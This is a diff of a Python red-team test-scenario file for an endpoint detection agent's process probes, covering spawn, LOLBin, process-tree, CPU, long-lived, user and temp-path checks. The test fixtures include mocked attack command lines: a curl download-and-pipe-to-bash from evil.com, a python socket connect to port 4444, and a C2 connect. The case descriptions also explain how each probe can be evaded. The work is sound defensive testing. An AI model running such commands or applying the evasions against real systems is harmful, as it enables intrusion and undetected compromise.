@@ -45,7 +45,7 @@ from __future__ import annotations
 from unittest.mock import MagicMock
 
 from amoskys.agents.common.probes import Severity
-from amoskys.agents.proc.probes import (
+from amoskys.agents.shared.process.probes import (
     BinaryFromTempProbe,
     CodeSigningProbe,
     DylibInjectionProbe,
@@ -62,7 +62,7 @@ from amoskys.redteam.scenarios import register
 
 # ─── Timestamp anchors ───────────────────────────────────────────────────────
 
-_T0 = 1_700_000_000.0       # Unix base (2023-11-14 22:13:20 UTC)
+_T0 = 1_700_000_000.0  # Unix base (2023-11-14 22:13:20 UTC)
 _T0_NS = int(_T0 * 1e9)
 
 # ─── psutil mock helpers ─────────────────────────────────────────────────────
@@ -113,29 +113,35 @@ def _time_fn(t: float):
 
 def _proc_factory(parent_name: str = "init"):
     """Return a psutil.Process(ppid) replacement yielding the named parent."""
+
     def _factory(pid):
         m = MagicMock()
         m.name.return_value = parent_name
         return m
+
     return _factory
 
 
 # ─── subprocess mock helpers ─────────────────────────────────────────────────
 
 
-def _dylib_ps_one(pid: int = 1234, proc_name: str = "bash",
-                  dylib: str = "/private/tmp/hooks.dylib"):
+def _dylib_ps_one(
+    pid: int = 1234, proc_name: str = "bash", dylib: str = "/private/tmp/hooks.dylib"
+):
     """Return a subprocess.run replacement with one DYLD_INSERT_LIBRARIES line."""
+
     def _run(cmd, *args, **kwargs):
         m = MagicMock()
         m.returncode = 0
         m.stdout = f"{pid} {proc_name} DYLD_INSERT_LIBRARIES={dylib}\n"
         return m
+
     return _run
 
 
 def _dylib_ps_two():
     """Return a subprocess.run replacement with two DYLD_INSERT_LIBRARIES lines."""
+
     def _run(cmd, *args, **kwargs):
         m = MagicMock()
         m.returncode = 0
@@ -144,76 +150,89 @@ def _dylib_ps_two():
             "5678 python3 DYLD_INSERT_LIBRARIES=/private/tmp/hook2.dylib\n"
         )
         return m
+
     return _run
 
 
 def _dylib_ps_no_dyld():
     """Return a subprocess.run replacement with no DYLD_INSERT_LIBRARIES."""
+
     def _run(cmd, *args, **kwargs):
         m = MagicMock()
         m.returncode = 0
         m.stdout = "1234 bash DYLD_LIBRARY_PATH=/usr/local/lib\n"
         return m
+
     return _run
 
 
 def _dylib_ps_framework():
     """Return a subprocess.run replacement with DYLD_FRAMEWORK_PATH only."""
+
     def _run(cmd, *args, **kwargs):
         m = MagicMock()
         m.returncode = 0
         m.stdout = "2345 python3 DYLD_FRAMEWORK_PATH=/usr/local/Frameworks\n"
         return m
+
     return _run
 
 
 def _ps_error():
     """Return a subprocess.run replacement that signals ps failure."""
+
     def _run(cmd, *args, **kwargs):
         m = MagicMock()
         m.returncode = 1
         m.stderr = "permission denied"
         m.stdout = ""
         return m
+
     return _run
 
 
 def _codesign_fail():
     """Return a codesign replacement returning non-zero (invalid signature)."""
+
     def _run(cmd, *args, **kwargs):
         m = MagicMock()
         m.returncode = 1
         m.stderr = "code object is not signed at all"
         m.stdout = ""
         return m
+
     return _run
 
 
 def _codesign_ok():
     """Return a codesign replacement returning 0 (valid signature)."""
+
     def _run(cmd, *args, **kwargs):
         m = MagicMock()
         m.returncode = 0
         m.stderr = ""
         m.stdout = ""
         return m
+
     return _run
 
 
 def _codesign_missing():
     """Return a subprocess.run replacement that raises FileNotFoundError."""
+
     def _run(cmd, *args, **kwargs):
         raise FileNotFoundError("codesign not found")
+
     return _run
 
 
 # ─── Patch-target key constants ───────────────────────────────────────────────
 
-_PA = "amoskys.agents.proc.probes.PSUTIL_AVAILABLE"
-_PI = "amoskys.agents.proc.probes.psutil.process_iter"
-_PP = "amoskys.agents.proc.probes.psutil.Process"
-_PF = "amoskys.agents.proc.probes.platform.system"
-_OE = "amoskys.agents.proc.probes.os.path.exists"
+_PA = "amoskys.agents.shared.process.probes.PSUTIL_AVAILABLE"
+_PI = "amoskys.agents.shared.process.probes.psutil.process_iter"
+_PP = "amoskys.agents.shared.process.probes.psutil.Process"
+_PF = "amoskys.agents.shared.process.probes.platform.system"
+_OE = "amoskys.agents.shared.process.probes.os.path.exists"
 _TT = "time.time"
 _SR = "subprocess.run"
 
@@ -244,7 +263,7 @@ def _pp(procs=(), parent_name="init", time_val=None, **extra):
 # Chain 3 (benigns):     cases 7-8 share probe E  (case 6 is standalone, breaks chain C)
 
 _KNOWN_PROCS = [
-    _mk_proc(_p(pid=1, name="launchd",     username="root")),
+    _mk_proc(_p(pid=1, name="launchd", username="root")),
     _mk_proc(_p(pid=2, name="kernel_task", username="root")),
     _mk_proc(_p(pid=3, name="loginwindow", username="user1")),
 ]
@@ -284,10 +303,12 @@ _SPAWN_POS1_FIRE = AdversarialCase(
     expect_event_types=["process_spawned"],
     expect_severity=Severity.INFO,
     stateful=True,
-    patch_targets=_pp([
-        *_KNOWN_PROCS,
-        _mk_proc(_p(pid=9999, name="bash", exe="/bin/bash", username="attacker")),
-    ]),
+    patch_targets=_pp(
+        [
+            *_KNOWN_PROCS,
+            _mk_proc(_p(pid=9999, name="bash", exe="/bin/bash", username="attacker")),
+        ]
+    ),
 )
 
 _SPAWN_EVA_HOLLOW = AdversarialCase(
@@ -325,10 +346,12 @@ _SPAWN_EVA_PRERUN_SETUP = AdversarialCase(
     events=[],
     expect_count=0,
     stateful=True,
-    patch_targets=_pp([
-        *_KNOWN_PROCS,
-        _mk_proc(_p(pid=9999, name="bash", exe="/bin/bash", username="attacker")),
-    ]),
+    patch_targets=_pp(
+        [
+            *_KNOWN_PROCS,
+            _mk_proc(_p(pid=9999, name="bash", exe="/bin/bash", username="attacker")),
+        ]
+    ),
 )
 
 _SPAWN_EVA_PRERUN_PERSIST = AdversarialCase(
@@ -350,10 +373,12 @@ _SPAWN_EVA_PRERUN_PERSIST = AdversarialCase(
     expect_count=0,
     expect_evades=True,
     stateful=True,
-    patch_targets=_pp([
-        *_KNOWN_PROCS,
-        _mk_proc(_p(pid=9999, name="bash", exe="/bin/bash", username="attacker")),
-    ]),
+    patch_targets=_pp(
+        [
+            *_KNOWN_PROCS,
+            _mk_proc(_p(pid=9999, name="bash", exe="/bin/bash", username="attacker")),
+        ]
+    ),
 )
 
 _SPAWN_EVA_INJECT = AdversarialCase(
@@ -386,10 +411,12 @@ _SPAWN_BENIGN_SETUP = AdversarialCase(
     events=[],
     expect_count=0,
     stateful=True,
-    patch_targets=_pp([
-        _mk_proc(_p(pid=1, name="launchd",  username="root")),
-        _mk_proc(_p(pid=2, name="syslogd",  username="root")),
-    ]),
+    patch_targets=_pp(
+        [
+            _mk_proc(_p(pid=1, name="launchd", username="root")),
+            _mk_proc(_p(pid=2, name="syslogd", username="root")),
+        ]
+    ),
 )
 
 _SPAWN_BENIGN_CRON = AdversarialCase(
@@ -411,39 +438,49 @@ _SPAWN_BENIGN_CRON = AdversarialCase(
     expect_event_types=["process_spawned"],
     expect_severity=Severity.INFO,
     stateful=True,
-    patch_targets=_pp([
-        _mk_proc(_p(pid=1, name="launchd", username="root")),
-        _mk_proc(_p(pid=2, name="syslogd", username="root")),
-        _mk_proc(_p(pid=3000, name="backup.sh", exe="/usr/local/bin/backup.sh",
-                    username="root")),
-    ]),
+    patch_targets=_pp(
+        [
+            _mk_proc(_p(pid=1, name="launchd", username="root")),
+            _mk_proc(_p(pid=2, name="syslogd", username="root")),
+            _mk_proc(
+                _p(
+                    pid=3000,
+                    name="backup.sh",
+                    exe="/usr/local/bin/backup.sh",
+                    username="root",
+                )
+            ),
+        ]
+    ),
 )
 
-process_spawn_scenario = register(Scenario(
-    probe_id="process_spawn",
-    agent="proc",
-    name="process_spawn",
-    title="Process Spawn Detection — T1059 / T1204",
-    description=(
-        "Exercises ProcessSpawnProbe across 3 stateful chains: "
-        "a 2-scan positive chain (baseline→fire), a 2-scan evasion chain "
-        "(pre-monitoring persistence), and a 2-scan benign chain. "
-        "Standalone evasion cases document process hollowing and thread injection."
-    ),
-    mitre_techniques=["T1059", "T1204"],
-    mitre_tactics=["execution"],
-    probe_factory=ProcessSpawnProbe,
-    cases=[
-        _SPAWN_POS1_SETUP,
-        _SPAWN_POS1_FIRE,
-        _SPAWN_EVA_HOLLOW,
-        _SPAWN_EVA_PRERUN_SETUP,
-        _SPAWN_EVA_PRERUN_PERSIST,
-        _SPAWN_EVA_INJECT,
-        _SPAWN_BENIGN_SETUP,
-        _SPAWN_BENIGN_CRON,
-    ],
-))
+process_spawn_scenario = register(
+    Scenario(
+        probe_id="process_spawn",
+        agent="proc",
+        name="process_spawn",
+        title="Process Spawn Detection — T1059 / T1204",
+        description=(
+            "Exercises ProcessSpawnProbe across 3 stateful chains: "
+            "a 2-scan positive chain (baseline→fire), a 2-scan evasion chain "
+            "(pre-monitoring persistence), and a 2-scan benign chain. "
+            "Standalone evasion cases document process hollowing and thread injection."
+        ),
+        mitre_techniques=["T1059", "T1204"],
+        mitre_tactics=["execution"],
+        probe_factory=ProcessSpawnProbe,
+        cases=[
+            _SPAWN_POS1_SETUP,
+            _SPAWN_POS1_FIRE,
+            _SPAWN_EVA_HOLLOW,
+            _SPAWN_EVA_PRERUN_SETUP,
+            _SPAWN_EVA_PRERUN_PERSIST,
+            _SPAWN_EVA_INJECT,
+            _SPAWN_BENIGN_SETUP,
+            _SPAWN_BENIGN_CRON,
+        ],
+    )
+)
 
 
 # =============================================================================
@@ -471,10 +508,22 @@ _LOLBIN_POS1 = AdversarialCase(
     expect_count=1,
     expect_event_types=["lolbin_execution"],
     expect_severity=Severity.HIGH,
-    patch_targets=_pp([_mk_proc(_p(
-        name="curl", exe="/usr/bin/curl",
-        cmdline=["curl", "-o", "/tmp/payload.exe", "http://evil.com/payload.exe"],
-    ))]),
+    patch_targets=_pp(
+        [
+            _mk_proc(
+                _p(
+                    name="curl",
+                    exe="/usr/bin/curl",
+                    cmdline=[
+                        "curl",
+                        "-o",
+                        "/tmp/payload.exe",
+                        "http://evil.com/payload.exe",
+                    ],
+                )
+            )
+        ]
+    ),
 )
 
 _LOLBIN_POS2 = AdversarialCase(
@@ -493,10 +542,21 @@ _LOLBIN_POS2 = AdversarialCase(
     expect_count=1,
     expect_event_types=["lolbin_execution"],
     expect_severity=Severity.HIGH,
-    patch_targets=_pp([_mk_proc(_p(
-        name="python3", exe="/usr/bin/python3",
-        cmdline=["python3", "-c", "import socket;s=socket.socket();s.connect(('10.0.0.1',4444))"],
-    ))]),
+    patch_targets=_pp(
+        [
+            _mk_proc(
+                _p(
+                    name="python3",
+                    exe="/usr/bin/python3",
+                    cmdline=[
+                        "python3",
+                        "-c",
+                        "import socket;s=socket.socket();s.connect(('10.0.0.1',4444))",
+                    ],
+                )
+            )
+        ]
+    ),
 )
 
 _LOLBIN_POS3 = AdversarialCase(
@@ -515,10 +575,21 @@ _LOLBIN_POS3 = AdversarialCase(
     expect_count=1,
     expect_event_types=["lolbin_execution"],
     expect_severity=Severity.HIGH,
-    patch_targets=_pp([_mk_proc(_p(
-        name="bash", exe="/bin/bash",
-        cmdline=["bash", "-c", "nohup curl http://evil.com/stager | bash &>/dev/null"],
-    ))]),
+    patch_targets=_pp(
+        [
+            _mk_proc(
+                _p(
+                    name="bash",
+                    exe="/bin/bash",
+                    cmdline=[
+                        "bash",
+                        "-c",
+                        "nohup curl http://evil.com/stager | bash &>/dev/null",
+                    ],
+                )
+            )
+        ]
+    ),
 )
 
 _LOLBIN_EVA1 = AdversarialCase(
@@ -537,10 +608,17 @@ _LOLBIN_EVA1 = AdversarialCase(
     events=[],
     expect_count=0,
     expect_evades=True,
-    patch_targets=_pp([_mk_proc(_p(
-        name="c2agent", exe="/usr/local/bin/c2agent",
-        cmdline=["c2agent", "--connect", "evil.com:443"],
-    ))]),
+    patch_targets=_pp(
+        [
+            _mk_proc(
+                _p(
+                    name="c2agent",
+                    exe="/usr/local/bin/c2agent",
+                    cmdline=["c2agent", "--connect", "evil.com:443"],
+                )
+            )
+        ]
+    ),
 )
 
 _LOLBIN_EVA2 = AdversarialCase(
@@ -559,10 +637,21 @@ _LOLBIN_EVA2 = AdversarialCase(
     events=[],
     expect_count=0,
     expect_evades=True,
-    patch_targets=_pp([_mk_proc(_p(
-        name="python3.12", exe="/usr/local/bin/python3.12",
-        cmdline=["python3.12", "-c", "import socket;exec(open('/tmp/p').read())"],
-    ))]),
+    patch_targets=_pp(
+        [
+            _mk_proc(
+                _p(
+                    name="python3.12",
+                    exe="/usr/local/bin/python3.12",
+                    cmdline=[
+                        "python3.12",
+                        "-c",
+                        "import socket;exec(open('/tmp/p').read())",
+                    ],
+                )
+            )
+        ]
+    ),
 )
 
 _LOLBIN_EVA3 = AdversarialCase(
@@ -582,10 +671,17 @@ _LOLBIN_EVA3 = AdversarialCase(
     events=[],
     expect_count=0,
     expect_evades=True,
-    patch_targets=_pp([_mk_proc(_p(
-        name="XPCHelper", exe="/usr/local/bin/XPCHelper",
-        cmdline=["XPCHelper", "--daemonize"],
-    ))]),
+    patch_targets=_pp(
+        [
+            _mk_proc(
+                _p(
+                    name="XPCHelper",
+                    exe="/usr/local/bin/XPCHelper",
+                    cmdline=["XPCHelper", "--daemonize"],
+                )
+            )
+        ]
+    ),
 )
 
 _LOLBIN_BENIGN1 = AdversarialCase(
@@ -605,10 +701,17 @@ _LOLBIN_BENIGN1 = AdversarialCase(
     expect_count=1,
     expect_event_types=["lolbin_execution"],
     expect_severity=Severity.LOW,
-    patch_targets=_pp([_mk_proc(_p(
-        name="curl", exe="/usr/bin/curl",
-        cmdline=["curl", "https://api.example.com/health"],
-    ))]),
+    patch_targets=_pp(
+        [
+            _mk_proc(
+                _p(
+                    name="curl",
+                    exe="/usr/bin/curl",
+                    cmdline=["curl", "https://api.example.com/health"],
+                )
+            )
+        ]
+    ),
 )
 
 _LOLBIN_BENIGN2 = AdversarialCase(
@@ -628,36 +731,45 @@ _LOLBIN_BENIGN2 = AdversarialCase(
     expect_count=1,
     expect_event_types=["lolbin_execution"],
     expect_severity=Severity.LOW,
-    patch_targets=_pp([_mk_proc(_p(
-        name="python3", exe="/usr/bin/python3",
-        cmdline=["python3", "analyze_logs.py", "--date", "2024-01-01"],
-    ))]),
+    patch_targets=_pp(
+        [
+            _mk_proc(
+                _p(
+                    name="python3",
+                    exe="/usr/bin/python3",
+                    cmdline=["python3", "analyze_logs.py", "--date", "2024-01-01"],
+                )
+            )
+        ]
+    ),
 )
 
-lolbin_execution_scenario = register(Scenario(
-    probe_id="lolbin_execution",
-    agent="proc",
-    name="lolbin_execution",
-    title="LOLBin Execution Detection — T1218",
-    description=(
-        "Tests LOLBinExecutionProbe's binary-name list + suspicious-pattern "
-        "detection. Evasions exploit the fixed LOLBin name list (exact match): "
-        "custom binaries, versioned names, and native compiled code all evade."
-    ),
-    mitre_techniques=["T1218", "T1218.010", "T1218.011"],
-    mitre_tactics=["defense_evasion", "execution"],
-    probe_factory=LOLBinExecutionProbe,
-    cases=[
-        _LOLBIN_POS1,
-        _LOLBIN_POS2,
-        _LOLBIN_POS3,
-        _LOLBIN_EVA1,
-        _LOLBIN_EVA2,
-        _LOLBIN_EVA3,
-        _LOLBIN_BENIGN1,
-        _LOLBIN_BENIGN2,
-    ],
-))
+lolbin_execution_scenario = register(
+    Scenario(
+        probe_id="lolbin_execution",
+        agent="proc",
+        name="lolbin_execution",
+        title="LOLBin Execution Detection — T1218",
+        description=(
+            "Tests LOLBinExecutionProbe's binary-name list + suspicious-pattern "
+            "detection. Evasions exploit the fixed LOLBin name list (exact match): "
+            "custom binaries, versioned names, and native compiled code all evade."
+        ),
+        mitre_techniques=["T1218", "T1218.010", "T1218.011"],
+        mitre_tactics=["defense_evasion", "execution"],
+        probe_factory=LOLBinExecutionProbe,
+        cases=[
+            _LOLBIN_POS1,
+            _LOLBIN_POS2,
+            _LOLBIN_POS3,
+            _LOLBIN_EVA1,
+            _LOLBIN_EVA2,
+            _LOLBIN_EVA3,
+            _LOLBIN_BENIGN1,
+            _LOLBIN_BENIGN2,
+        ],
+    )
+)
 
 
 # =============================================================================
@@ -667,6 +779,7 @@ lolbin_execution_scenario = register(Scenario(
 # Checks (parent_name, child_name) pairs against SUSPICIOUS_TREES using
 # substring matching (parent_name in process_name). psutil.Process(ppid) is
 # mocked to supply parent name.
+
 
 def _tree_patches(child_name: str, child_ppid: int, parent_name: str) -> dict:
     """Build patch dict for ProcessTreeAnomalyProbe tests."""
@@ -828,31 +941,33 @@ _TREE_BENIGN2 = AdversarialCase(
     patch_targets=_tree_patches("bash", 900, "launchd"),
 )
 
-process_tree_scenario = register(Scenario(
-    probe_id="process_tree_anomaly",
-    agent="proc",
-    name="process_tree_anomaly",
-    title="Process Tree Anomaly Detection — T1055 / T1059",
-    description=(
-        "Tests ProcessTreeAnomalyProbe's (parent, child) pair matching. "
-        "Covers Office macro, browser exploit, and PDF exploit positives. "
-        "Evasions show that partial pairs, new parent processes, and non-listed "
-        "child binaries all bypass the fixed SUSPICIOUS_TREES dictionary."
-    ),
-    mitre_techniques=["T1055", "T1059"],
-    mitre_tactics=["execution", "defense_evasion"],
-    probe_factory=ProcessTreeAnomalyProbe,
-    cases=[
-        _TREE_POS1,
-        _TREE_POS2,
-        _TREE_POS3,
-        _TREE_EVA1,
-        _TREE_EVA2,
-        _TREE_EVA3,
-        _TREE_BENIGN1,
-        _TREE_BENIGN2,
-    ],
-))
+process_tree_scenario = register(
+    Scenario(
+        probe_id="process_tree_anomaly",
+        agent="proc",
+        name="process_tree_anomaly",
+        title="Process Tree Anomaly Detection — T1055 / T1059",
+        description=(
+            "Tests ProcessTreeAnomalyProbe's (parent, child) pair matching. "
+            "Covers Office macro, browser exploit, and PDF exploit positives. "
+            "Evasions show that partial pairs, new parent processes, and non-listed "
+            "child binaries all bypass the fixed SUSPICIOUS_TREES dictionary."
+        ),
+        mitre_techniques=["T1055", "T1059"],
+        mitre_tactics=["execution", "defense_evasion"],
+        probe_factory=ProcessTreeAnomalyProbe,
+        cases=[
+            _TREE_POS1,
+            _TREE_POS2,
+            _TREE_POS3,
+            _TREE_EVA1,
+            _TREE_EVA2,
+            _TREE_EVA3,
+            _TREE_BENIGN1,
+            _TREE_BENIGN2,
+        ],
+    )
+)
 
 
 # =============================================================================
@@ -870,7 +985,7 @@ process_tree_scenario = register(Scenario(
 
 _CPU_PID = 5000
 _MEM_PID = 6000
-_CC_PID  = 8000
+_CC_PID = 8000
 
 _CPU_SETUP = AdversarialCase(
     id="hicpu_pos1_setup",
@@ -1002,7 +1117,10 @@ _HICPU_DISTRIBUTED = AdversarialCase(
     expect_evades=True,
     stateful=False,
     patch_targets=_pp(
-        [_mk_proc(_p(pid=9000 + i, name="worker", cpu_percent=15.0)) for i in range(10)],
+        [
+            _mk_proc(_p(pid=9000 + i, name="worker", cpu_percent=15.0))
+            for i in range(10)
+        ],
         time_val=_T0,
     ),
 )
@@ -1050,31 +1168,33 @@ _HICPU_COMPILER_FIRE = AdversarialCase(
     ),
 )
 
-high_cpu_memory_scenario = register(Scenario(
-    probe_id="high_cpu_memory",
-    agent="proc",
-    name="high_cpu_memory",
-    title="High CPU/Memory Resource Abuse — T1496",
-    description=(
-        "Tests HighCPUAndMemoryProbe's sustained-threshold logic across 3 "
-        "stateful chains. Shows that throttling below the 80% threshold, brief "
-        "spikes that drop before 60s, and distributed multi-process mining all "
-        "evade per-process sustained-threshold detection."
-    ),
-    mitre_techniques=["T1496"],
-    mitre_tactics=["impact"],
-    probe_factory=HighCPUAndMemoryProbe,
-    cases=[
-        _CPU_SETUP,
-        _CPU_FIRE,
-        _HICPU_EVA_THROTTLE,
-        _HICPU_BRIEF_SETUP,
-        _HICPU_BRIEF_DROP,
-        _HICPU_DISTRIBUTED,
-        _HICPU_COMPILER_SETUP,
-        _HICPU_COMPILER_FIRE,
-    ],
-))
+high_cpu_memory_scenario = register(
+    Scenario(
+        probe_id="high_cpu_memory",
+        agent="proc",
+        name="high_cpu_memory",
+        title="High CPU/Memory Resource Abuse — T1496",
+        description=(
+            "Tests HighCPUAndMemoryProbe's sustained-threshold logic across 3 "
+            "stateful chains. Shows that throttling below the 80% threshold, brief "
+            "spikes that drop before 60s, and distributed multi-process mining all "
+            "evade per-process sustained-threshold detection."
+        ),
+        mitre_techniques=["T1496"],
+        mitre_tactics=["impact"],
+        probe_factory=HighCPUAndMemoryProbe,
+        cases=[
+            _CPU_SETUP,
+            _CPU_FIRE,
+            _HICPU_EVA_THROTTLE,
+            _HICPU_BRIEF_SETUP,
+            _HICPU_BRIEF_DROP,
+            _HICPU_DISTRIBUTED,
+            _HICPU_COMPILER_SETUP,
+            _HICPU_COMPILER_FIRE,
+        ],
+    )
+)
 
 
 # =============================================================================
@@ -1083,6 +1203,7 @@ high_cpu_memory_scenario = register(Scenario(
 #
 # Fires MEDIUM when a process in EXPECTED_SHORT_LIVED has been running > 3600s.
 # create_time is set in proc info; time.time() is mocked to return _T0.
+
 
 def _ll_patches(name: str, create_time: float) -> dict:
     return _pp(
@@ -1118,9 +1239,7 @@ _LL_POS2 = AdversarialCase(
         "Reverse shell renamed 'awk' has persisted for 2+ hours. "
         "awk is a text-processing utility; sustained execution is suspicious."
     ),
-    why=(
-        "'awk' ∈ EXPECTED_SHORT_LIVED. runtime = 4500 > 3600 → fires MEDIUM."
-    ),
+    why=("'awk' ∈ EXPECTED_SHORT_LIVED. runtime = 4500 > 3600 → fires MEDIUM."),
     events=[],
     expect_count=1,
     expect_event_types=["unexpectedly_long_process"],
@@ -1232,30 +1351,32 @@ _LL_BENIGN2 = AdversarialCase(
     patch_targets=_ll_patches("cat", _T0 - 2_400.0),
 )
 
-long_lived_process_scenario = register(Scenario(
-    probe_id="long_lived_process",
-    agent="proc",
-    name="long_lived_process",
-    title="Long-Lived Process Masquerading — T1036",
-    description=(
-        "Tests LongLivedProcessProbe's EXPECTED_SHORT_LIVED list + 3600s "
-        "threshold. Evasions: restart cycling (resets create_time), and using "
-        "a name not in the monitored list (kworker, python3)."
-    ),
-    mitre_techniques=["T1036"],
-    mitre_tactics=["persistence", "defense_evasion"],
-    probe_factory=LongLivedProcessProbe,
-    cases=[
-        _LL_POS1,
-        _LL_POS2,
-        _LL_POS3,
-        _LL_EVA1,
-        _LL_EVA2,
-        _LL_EVA3,
-        _LL_BENIGN1,
-        _LL_BENIGN2,
-    ],
-))
+long_lived_process_scenario = register(
+    Scenario(
+        probe_id="long_lived_process",
+        agent="proc",
+        name="long_lived_process",
+        title="Long-Lived Process Masquerading — T1036",
+        description=(
+            "Tests LongLivedProcessProbe's EXPECTED_SHORT_LIVED list + 3600s "
+            "threshold. Evasions: restart cycling (resets create_time), and using "
+            "a name not in the monitored list (kworker, python3)."
+        ),
+        mitre_techniques=["T1036"],
+        mitre_tactics=["persistence", "defense_evasion"],
+        probe_factory=LongLivedProcessProbe,
+        cases=[
+            _LL_POS1,
+            _LL_POS2,
+            _LL_POS3,
+            _LL_EVA1,
+            _LL_EVA2,
+            _LL_EVA3,
+            _LL_BENIGN1,
+            _LL_BENIGN2,
+        ],
+    )
+)
 
 
 # =============================================================================
@@ -1264,6 +1385,7 @@ long_lived_process_scenario = register(Scenario(
 #
 # Fires HIGH when a process in ROOT_ONLY_PROCESSES runs as any user other than
 # "root", "system", or "nt authority\\system".
+
 
 def _susp_patches(name: str, username: str) -> dict:
     return _pp([_mk_proc(_p(name=name, username=username))])
@@ -1393,49 +1515,49 @@ _SUSP_BENIGN1 = AdversarialCase(
 
 _SUSP_BENIGN2 = AdversarialCase(
     id="susp_benign2_postgres_service",
-    title="postgres as 'postgres' service account — fires HIGH (FP_RISK)",
+    title="postgres as 'postgres' service account — 0 events (correctly excluded)",
     category="benign",
     description=(
         "PostgreSQL uses a dedicated 'postgres' OS account as a security "
-        "isolation boundary. Probe fires HIGH — cannot distinguish legitimate "
-        "service account isolation from an attacker's wrong-user escalation."
+        "isolation boundary. postgres was removed from ROOT_ONLY_PROCESSES "
+        "because it is designed to run as a non-root service account."
     ),
     why=(
-        "username='postgres' ∉ {'root','system'} → fires HIGH. Same FP pattern "
-        "as nginx: ROOT_ONLY_PROCESSES needs a per-service expected-user "
-        "whitelist to reduce false positives on hardened systems."
+        "'postgres' ∉ ROOT_ONLY_PROCESSES (removed: designed for privilege-drop) "
+        "→ probe skips it → 0 events. This is the correct behavior."
     ),
     events=[],
-    expect_count=1,
-    expect_severity=Severity.HIGH,
+    expect_count=0,
     patch_targets=_susp_patches("postgres", "postgres"),
 )
 
-suspicious_user_process_scenario = register(Scenario(
-    probe_id="suspicious_user_process",
-    agent="proc",
-    name="suspicious_user_process",
-    title="Suspicious User Process — T1078 (Valid Accounts)",
-    description=(
-        "Tests SuspiciousUserProcessProbe's ROOT_ONLY_PROCESSES list. "
-        "Evasions: running as root (probe checks non-root only), using a process "
-        "name not in the list. FP cases: legitimate service-account privilege-drop "
-        "(nginx, postgres) fire HIGH despite being a security best practice."
-    ),
-    mitre_techniques=["T1078"],
-    mitre_tactics=["privilege_escalation", "defense_evasion"],
-    probe_factory=SuspiciousUserProcessProbe,
-    cases=[
-        _SUSP_POS1,
-        _SUSP_POS2,
-        _SUSP_POS3,
-        _SUSP_EVA1,
-        _SUSP_EVA2,
-        _SUSP_EVA3,
-        _SUSP_BENIGN1,
-        _SUSP_BENIGN2,
-    ],
-))
+suspicious_user_process_scenario = register(
+    Scenario(
+        probe_id="suspicious_user_process",
+        agent="proc",
+        name="suspicious_user_process",
+        title="Suspicious User Process — T1078 (Valid Accounts)",
+        description=(
+            "Tests SuspiciousUserProcessProbe's ROOT_ONLY_PROCESSES list. "
+            "Evasions: running as root (probe checks non-root only), using a process "
+            "name not in the list. FP cases: legitimate service-account privilege-drop "
+            "(nginx, postgres) fire HIGH despite being a security best practice."
+        ),
+        mitre_techniques=["T1078"],
+        mitre_tactics=["privilege_escalation", "defense_evasion"],
+        probe_factory=SuspiciousUserProcessProbe,
+        cases=[
+            _SUSP_POS1,
+            _SUSP_POS2,
+            _SUSP_POS3,
+            _SUSP_EVA1,
+            _SUSP_EVA2,
+            _SUSP_EVA3,
+            _SUSP_BENIGN1,
+            _SUSP_BENIGN2,
+        ],
+    )
+)
 
 
 # =============================================================================
@@ -1443,6 +1565,7 @@ suspicious_user_process_scenario = register(Scenario(
 # =============================================================================
 #
 # Fires HIGH when process exe path matches any TEMP_PATTERNS (regex).
+
 
 def _bft_patches(exe_path: str, name: str = "evil") -> dict:
     return _pp([_mk_proc(_p(name=name, exe=exe_path))])
@@ -1502,7 +1625,7 @@ _BFT_EVA1 = AdversarialCase(
         "installation path). Not in TEMP_PATTERNS → no detection."
     ),
     why="/usr/local/bin/ ∉ TEMP_PATTERNS → 0 events. Persisting to a standard "
-        "bin directory evades temp-execution detection.",
+    "bin directory evades temp-execution detection.",
     events=[],
     expect_count=0,
     expect_evades=True,
@@ -1511,25 +1634,33 @@ _BFT_EVA1 = AdversarialCase(
 
 _BFT_EVA2 = AdversarialCase(
     id="bft_eva2_script_in_tmp",
-    title="python3 runs /tmp/evil.py — exe is python3, not temp path",
-    category="evasion",
+    title="python3 runs /tmp/evil.py — cmdline check catches script path",
+    category="positive",
     description=(
         "Attacker drops a Python script in /tmp/evil.py and runs it with "
-        "python3. The process exe is /usr/bin/python3 (not a temp path); "
-        "only the script argument is in /tmp."
+        "python3. The exe is /usr/bin/python3, but the cmdline contains "
+        "/tmp/evil.py which the probe now checks."
     ),
     why=(
-        "BinaryFromTempProbe checks exe, not cmdline. "
-        "exe='/usr/bin/python3' ∉ TEMP_PATTERNS → 0 events. "
-        "Script-based attacks evade exe-path detection."
+        "BinaryFromTempProbe checks both exe and cmdline[1:3]. "
+        "cmdline[1]='/tmp/evil.py' matches r'/tmp/' → execution_from_temp HIGH. "
+        "Script-from-temp evasion is closed."
     ),
     events=[],
-    expect_count=0,
-    expect_evades=True,
-    patch_targets=_pp([_mk_proc(_p(
-        name="python3", exe="/usr/bin/python3",
-        cmdline=["python3", "/tmp/evil.py"],
-    ))]),
+    expect_count=1,
+    expect_event_types=["execution_from_temp"],
+    expect_severity=Severity.HIGH,
+    patch_targets=_pp(
+        [
+            _mk_proc(
+                _p(
+                    name="python3",
+                    exe="/usr/bin/python3",
+                    cmdline=["python3", "/tmp/evil.py"],
+                )
+            )
+        ]
+    ),
 )
 
 _BFT_EVA3 = AdversarialCase(
@@ -1590,31 +1721,33 @@ _BFT_BENIGN2 = AdversarialCase(
     ),
 )
 
-binary_from_temp_scenario = register(Scenario(
-    probe_id="binary_from_temp",
-    agent="proc",
-    name="binary_from_temp",
-    title="Binary Execution from Temp Directory — T1204",
-    description=(
-        "Tests BinaryFromTempProbe's TEMP_PATTERNS regex matching on exe paths. "
-        "Key evasions: installing to a permanent path (/usr/local/bin), using an "
-        "interpreter to run a script (exe is the interpreter, not the script), "
-        "and using /var/run/ (not in the pattern list)."
-    ),
-    mitre_techniques=["T1204", "T1059"],
-    mitre_tactics=["execution"],
-    probe_factory=BinaryFromTempProbe,
-    cases=[
-        _BFT_POS1,
-        _BFT_POS2,
-        _BFT_POS3,
-        _BFT_EVA1,
-        _BFT_EVA2,
-        _BFT_EVA3,
-        _BFT_BENIGN1,
-        _BFT_BENIGN2,
-    ],
-))
+binary_from_temp_scenario = register(
+    Scenario(
+        probe_id="binary_from_temp",
+        agent="proc",
+        name="binary_from_temp",
+        title="Binary Execution from Temp Directory — T1204",
+        description=(
+            "Tests BinaryFromTempProbe's TEMP_PATTERNS regex matching on exe paths. "
+            "Key evasions: installing to a permanent path (/usr/local/bin), using an "
+            "interpreter to run a script (exe is the interpreter, not the script), "
+            "and using /var/run/ (not in the pattern list)."
+        ),
+        mitre_techniques=["T1204", "T1059"],
+        mitre_tactics=["execution"],
+        probe_factory=BinaryFromTempProbe,
+        cases=[
+            _BFT_POS1,
+            _BFT_POS2,
+            _BFT_POS3,
+            _BFT_EVA1,
